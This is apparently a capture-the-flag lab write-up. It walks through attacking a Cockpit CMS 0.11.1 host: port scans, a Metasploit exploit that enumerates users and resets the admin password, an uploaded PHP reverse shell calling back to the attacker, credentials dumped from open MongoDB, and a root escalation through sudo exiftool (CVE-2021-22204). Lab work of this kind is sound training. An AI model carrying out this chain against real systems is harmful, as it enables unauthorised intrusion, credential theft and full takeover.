Port scanning

```bash
nmap -p- --min-rate=5000 10.10.27.160  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 21:14 EEST
Warning: 10.10.27.160 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.27.160
Host is up (0.26s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 23.69 seconds
                                                                                                    
┌──(kali㉿kali)-[~]
└─$ nmap -p 22,80 -sC -sV 10.10.27.160     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 21:16 EEST
Nmap scan report for 10.10.27.160
Host is up (0.30s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7f:25:f9:40:23:25:cd:29:8b:28:a9:d9:82:f5:49:e4 (RSA)
|   256 0a:f4:29:ed:55:43:19:e7:73:a7:09:79:30:a8:49:1b (ECDSA)
|_  256 2f:43:ad:a3:d1:5b:64:86:33:07:5d:94:f9:dc:a4:01 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-title: Authenticate Please!
|_Requested resource was /auth/login?to=/
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.38 seconds
```

The website is running apache and is a login screen into cockpit cms.

The cockpits CMS version is 0.11.1 and we are going to search for vulnerabilites.

We found one affecting the same CMS version..

I used msfconsole to get the credentials etc. I was unable to get a RCE 

```bash
msf exploit(multi/http/cockpit_cms_rce) > exploit
[*] Started reverse TCP handler on 192.168.122.188:4444 
[*] Attempting Username Enumeration (CVE-2020-35846)
[+]   Found users: ["admin", "darkStar7471", "skidy", "ekoparty"]
[*] Obtaining reset tokens (CVE-2020-35847)
[+]   Found tokens: ["rp-14fa2c069a790bebe846f9faed517e4368b493418f36b"]
[*] Checking token: rp-14fa2c069a790bebe846f9faed517e4368b493418f36b
[*] Obtaining user info
[*]   user: admin
[*]   name: Admin
[*]   email: admin@yourdomain.de
[*]   active: true
[*]   group: admin
[*]   password: $2y$10$dChrF2KNbWuib/5lW1ePiegKYSxHeqWwrVC.FN5kyqhIsIdbtnOjq
[*]   i18n: en
[*]   _created: 1621655201
[*]   _modified: 1621655201
[*]   _id: 60a87ea165343539ee000300
[*]   _reset_token: rp-14fa2c069a790bebe846f9faed517e4368b493418f36b
[*]   md5email: a11eea8bf873a483db461bb169beccec
[+] Changing password to YBrhPRRCAj
[+] Password update successful
[*] Attempting login
[+] Valid cookie for admin: 8071dec2be26139e39a170762581c00f=o9h1epm6vptraq5jo35sv9co7p;
[*] Attempting RCE
```

Ok so the exploit changed it to admin:YBrhPRRCAj
and we were able to log in. Great. 


Since I was an admin I just could upload a reverse shell onto the website and then just go to the page and get a shell..

```bash
http://10.10.27.160/revshell.php
listening on [any] 4444 ...
connect to [10.6.25.159] from (UNKNOWN) [10.10.27.160] 38506
Linux ubuntu 4.4.0-210-generic #242-Ubuntu SMP Fri Apr 16 09:57:56 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 12:04:11 up 51 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (758): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/$ 
```
The machine uses mongodb and it doesnt require credentials so we can use it 

```bash
> show collections
flag
system.indexes
user
> db.flag.find()
{ "_id" : ObjectId("60a89f3aaadffb0ea68915fb"), "name" : "thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}" }
```

We also got the login info for the other user so we can log in via SSH

```bash
> db.user.find()
{ "_id" : ObjectId("60a89d0caadffb0ea68915f9"), "name" : "p4ssw0rdhack3d!123" }
{ "_id" : ObjectId("60a89dfbaadffb0ea68915fa"), "name" : "stux" }
```

```bash
stux@ubuntu:~$ cat user.txt 
thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}
```


great.

```bash

stux@ubuntu:~$ sudo  -l
Matching Defaults entries for stux on ubuntu:                                                       
    env_reset, mail_badpass,                                                                        
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin        

User stux may run the following commands on ubuntu:
    (root) NOPASSWD: /usr/local/bin/exiftool
```


The machine kinda gave us a hint to use the exiftool exploit of CVE-2021-22204 

The vulnerability allows arbitrary code execution when parsing the malicious image


```bash
stux@ubuntu:~$ ./craft_a_djvu_exploit.sh '/bin/bash'
stux@ubuntu:~$ sudo exiftool delicate.jpg 
root@ubuntu:~# cat /root/root.txt
thm{bf52a85b12cf49b9b6d77643771d74e90d4d5ada}
```

Basically I used the script to create an image that when ran as superuser "root" it executes binbash which creates us a root shell and we were able to get the root flag.


